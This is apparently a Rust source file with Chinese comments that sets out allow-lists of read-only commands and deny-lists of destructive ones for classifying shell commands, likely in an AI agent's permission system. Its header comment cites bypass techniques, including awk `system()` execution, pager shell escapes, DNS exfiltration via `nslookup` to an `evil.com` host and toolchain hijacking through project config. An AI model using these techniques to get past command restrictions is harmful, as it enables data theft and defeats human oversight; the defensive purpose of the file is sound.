//! The command lists classification matches against.

// **进这个名单的门槛**：命令必须做到"不管带什么参数都不会写文件、不会执行
// 别的程序、不会向参数里的主机发请求"。参数层的兜底（`args_forfeit_read_only`）
// 只认得列出来的那些选项，所以只要存在一种写法能让它派生 shell，就不能进来。
// 因此不在名单里的：
//
// - `awk`：`awk 'BEGIN{system("...")}'` 直接执行任意命令，还有 `print > "file"`、
//   `| "sh"` 等多条写/执行路径。想靠扫描 program text 里的 `system(` / `print >`
//   把它捞回来并不稳（引号拼接、`ENVIRON`、`--source` 等绕法太多），干脆不收。
//   `gawk` / `mawk` 同理。
// - `less` / `more`：都支持 `!cmd` shell 逃逸（less 还有 `-s`/lesspipe）。
// - `env`：它是命令**前缀**不是命令，被它包住的真命令才是分类对象。光秃秃的
//   `env` 会把环境变量整个倒进 transcript，也不算只读。
// - `dig` / `ping` / `nslookup` / `traceroute`：按参数里的主机名发 DNS 查询，
//   `nslookup <编码后的数据>.evil.com` 就把数据带出去了。`npm view`
//   （`--registry=https://evil/`）、`brew info` / `brew search`、
//   `git remote show <URL>` 同理：要联网，主机由参数决定。`git remote` 只留
//   不联网的写法（光秃秃、`-v`、`get-url`），见 `git_forfeits_read_only`。
// - `brew`：整个不收。它按 `HOMEBREW_*` 变量拉起浏览器、编辑器等别的程序，
//   `brew list` 也读这些变量。
// - `cargo metadata` / `cargo tree`：要问 rustc，而项目的 `.cargo/config.toml`
//   能把 rustc 换成任意程序（`build.rustc-wrapper`）；`cargo` / `rustc
//   --version` 与 `rustup show` 跑的是 `rust-toolchain.toml` 指定的工具链，
//   它可以是一个路径。
// - `node` / `npm` / `pip`（`--version`、`list`、`show` 也不收）：装了
//   asdf / nvm / volta / pyenv 时它们是 shim，按项目里的 `.tool-versions` /
//   `.nvmrc` / `.python-version` / `package.json` 选二进制，asdf 还认
//   `path:`，等于让项目指定一个任意程序。
//
// 留在名单里但受参数约束的：`find`（`-exec` 家族见 `FIND_UNSAFE_PREDICATES`）、
// 以及所有会读文件的命令（`cat`/`head`/`tail`/`xxd`/`strings`/`od`/`hexdump`/
// `bat`/`jq`/`grep`…）—— 参数指向凭据目录时整行不算只读。
//
// `command` 在名单里是因为它作为程序出现时只是在查名字（`command -v ls`）；
// 它包住的命令（`command ls`）各按各的分类。
pub(super) const READ_ONLY_COMMANDS: &[&str] = &[
    "ls",
    "find",
    "grep",
    "rg",
    "fgrep",
    "egrep",
    "fd",
    "ag",
    "ack",
    "cat",
    "head",
    "tail",
    "wc",
    "echo",
    "printf",
    "pwd",
    "which",
    "type",
    "command",
    "true",
    "false",
    "uname",
    "hostname",
    "date",
    "whoami",
    "id",
    "ps",
    "df",
    "du",
    "stat",
    "file",
    "tree",
    "tr",
    "cut",
    "sort",
    "uniq",
    "test",
    "[",
    "realpath",
    "basename",
    "dirname",
    "free",
    "uptime",
    "groups",
    // 文档 / 查阅
    "man",
    "info",
    "whatis",
    "apropos",
    // 网络状态（只读本机）
    "netstat",
    "ss",
    // 文件比较
    "diff",
    "cmp",
    "comm",
    // 目录/文件列示（ls 替代品）
    "exa",
    "eza",
    "bat",
    // 二进制分析
    "nm",
    "objdump",
    "readelf",
    "strings",
    "xxd",
    "hexdump",
    "od",
    // 哈希校验
    "sha256sum",
    "shasum",
    "md5",
    "cksum",
    "sum",
    // 硬件 / 系统信息
    "lscpu",
    "lshw",
    "lsblk",
    "lspci",
    "lsusb",
    "system_profiler",
    "sw_vers",
    // 日期 / 计算
    "cal",
    "ncal",
    "time",
    // 数据生成（无副作用）
    "yes",
    "seq",
    "shuf",
    // 其它只读
    "namei",
    "jq",
    "yq",
    // 目录导航（只读，常与其它命令用 && 组合）
    "cd",
    "pushd",
    "popd",
    "dirs",
];

/// "<word> <word>" 级 read-only：前两个 token 命中视为只读。
pub(super) const READ_ONLY_PREFIXES: &[&str] = &[
    "git status",
    "git log",
    "git diff",
    "git show",
    "git rev-parse",
    "git branch",
    "git remote",
    "git ls-files",
    "git config",
    "git blame",
    "git describe",
    "git grep",
    "git shortlog",
    "git stash list",
    "git tag",
    "git cherry",
    // No `cargo`, `rustc`, `node`, `npm`, `pip` or `brew` at all: see the
    // note at the top of this file.
    // Rustup 信息
    "rustup toolchain list",
    // Docker 只读
    "docker ps",
    "docker images",
    "docker inspect",
    "docker stats",
    // K8s 只读
    "kubectl get",
    "kubectl describe",
    "kubectl logs",
    "kubectl top",
    // macOS 系统信息
    "diskutil list",
    "diskutil info",
    "sysctl -a",
    "sysctl -n",
];

/// destructive 前缀：要么整命令以这些开头，要么前两 token 等于这些。
pub(super) const DESTRUCTIVE_PREFIXES: &[&str] = &[
    "rm",
    "rmdir",
    "mv",
    "cp",
    "sudo",
    "su",
    "chmod",
    "chown",
    "chgrp",
    "dd",
    "mkfs",
    "mount",
    "umount",
    "shred",
    "shutdown",
    "reboot",
    "halt",
    "git reset",
    "git push",
    "git clean",
    "git rebase",
    "git checkout",
    "kubectl delete",
    "docker rm",
    "docker rmi",
    "docker system prune",
    "npm publish",
    "npm uninstall",
    "cargo publish",
];
